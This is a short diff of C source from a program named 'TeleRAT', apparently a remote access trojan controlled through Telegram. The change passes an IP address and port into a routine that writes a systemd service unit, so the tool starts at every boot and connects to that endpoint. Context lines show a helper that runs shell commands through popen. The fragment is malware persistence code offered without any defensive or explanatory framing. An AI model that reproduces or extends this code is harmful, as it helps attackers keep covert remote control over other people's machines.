@@ -30,7 +30,7 @@ void exeCMD(char *cmd){
     pclose(fp);
 }
 
-void initSetiing(char *path,char *pName){
+void initSetiing(char *path,char *pName,char *ip,char *port){
     struct cmd_struct cmd;
 
 	//Connect path with program	
@@ -48,9 +48,9 @@ void initSetiing(char *path,char *pName){
 	sprintf(text,"[Unit]\n"
 		"Description = TeleRAT Remote Administrator Via Telegram\n\n"
         "[Service]\n"
-	    "ExecStart = %s\n\n"
+	    "ExecStart = %s %s %s\n\n"
 		"[Install]\n"
-	    "WantedBy=multi-user.target\n\n",cmd.cmd);
+	    "WantedBy=multi-user.target\n\n",cmd.cmd,ip,port);
     printf("%s",text);
 	fprintf(f,"%s",text);
     free(text);
